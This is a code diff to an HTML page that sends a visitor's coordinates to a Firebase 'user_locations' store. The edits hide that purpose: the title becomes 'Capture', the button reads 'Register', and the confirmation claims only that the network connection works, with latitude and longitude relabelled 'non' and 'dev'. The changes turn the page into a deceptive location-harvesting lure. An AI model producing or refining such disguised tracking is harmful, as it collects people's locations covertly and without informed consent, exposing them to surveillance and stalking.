@@ -1,11 +1,11 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Location Capture</title>
+  <title>Capture</title>
 </head>
 <body>
 
-<button id="startBtn">Get My Location</button>
+<button id="startBtn">Register</button>
 <div id="status">Click the button to start</div>
   
 <script type="module">
@@ -45,7 +45,7 @@
         push(ref(db, "user_locations"), data)
           .then(() => {
             statusEl.innerHTML = `
-              ✅ Location saved<br>
+              ✅connection ok(network working)<br>
               non: ${data.lat}<br>
               dev: ${data.lng}
             `;
